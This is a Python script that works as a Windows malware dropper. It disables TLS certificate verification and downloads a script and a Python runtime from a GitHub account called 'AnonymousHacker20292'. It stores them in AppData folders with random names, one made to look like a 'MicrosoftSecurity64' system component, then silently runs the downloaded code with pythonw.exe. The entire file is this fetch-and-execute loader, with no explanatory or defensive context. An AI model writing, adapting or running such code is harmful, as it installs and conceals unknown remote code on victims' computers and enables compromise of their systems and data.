import urllib.request
import os
import ssl
import subprocess
import sys
import shutil
import random
from zipfile import ZipFile
DEBUG_ALL = True
#type:ignore

def extract(zip_path, target):
  with ZipFile(zip_path) as zf:
    zf.extractall(path=target)

def add_to_path(directory):
  path = os.environ.get('PATH', '')
  if directory not in path.split(os.pathsep):
      os.environ['PATH'] = directory + os.pathsep + path

def get_windows_user_directory():
  return os.path.expanduser('~')

def create_python_folder():
  user = get_windows_user_directory()
  id = 'python_src' + str(random.randrange(0, 1000))
  try:
    ad = os.path.join(os.path.join(user, 'AppData'), rf'Local\Microsoft\Windows\{id}')
    os.mkdir(ad)
  except Exception as ex:
    if DEBUG_ALL:
      print(f"Error creating py folder: {ex}")
    try:
      mg = os.path.join(os.getcwd(), id)
      os.mkdir(mg)
    except Exception as e:
      if DEBUG_ALL:
        print(f"2nd Error creating py folder: {e}")
      return os.getcwd()
    else:
      return mg
  else:
    return ad

def create_appdata_folder():
  user = get_windows_user_directory()
  id = 'MicrosoftSecurity64' + str(random.randrange(1,1000))
  try:
    ad = os.path.join(os.path.join(user, 'AppData'), rf'Local\Microsoft\Windows\{id}')
    os.mkdir(ad)
  except Exception as ex:
    if DEBUG_ALL:
      print(f"Error creating appdata folder: {ex}")
    try:
      mg = os.path.join(os.getcwd(), id)
      os.mkdir(mg)
    except Exception as e:
      if DEBUG_ALL:
        print(f"2nd Error creating appdata folder: {e}")
      return os.getcwd()
    else:
      return mg
  else:
    return ad

def download_file(url, save_path):
  ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
  ssl_context.check_hostname = False
  ssl_context.verify_mode = ssl.CERT_NONE
  with urllib.request.urlopen(url, context=ssl_context) as response:
    with open(save_path, 'wb') as out_file:
      shutil.copyfileobj(response, out_file)
      
path = "https://github.com/AnonymousHacker20292/srcode/raw/main/main.py"
pythonzip = "https://github.com/AnonymousHacker20292/srcode/raw/main/python-3.12.3.zip"
save = os.path.join(create_appdata_folder(), 'main.py')
save2 = os.path.join(create_python_folder(), 'python.zip')
download_file(path, save)
download_file(pythonzip, save2)
pyfold = create_python_folder()
extract(save2, pyfold)
add_to_path(pyfold)
python_executable = os.path.join(pyfold, 'pythonw.exe')
try:
  subprocess.Popen([python_executable, save])
except Exception as exc:
  if DEBUG_ALL:
    print(f"Error at end: {exc}")
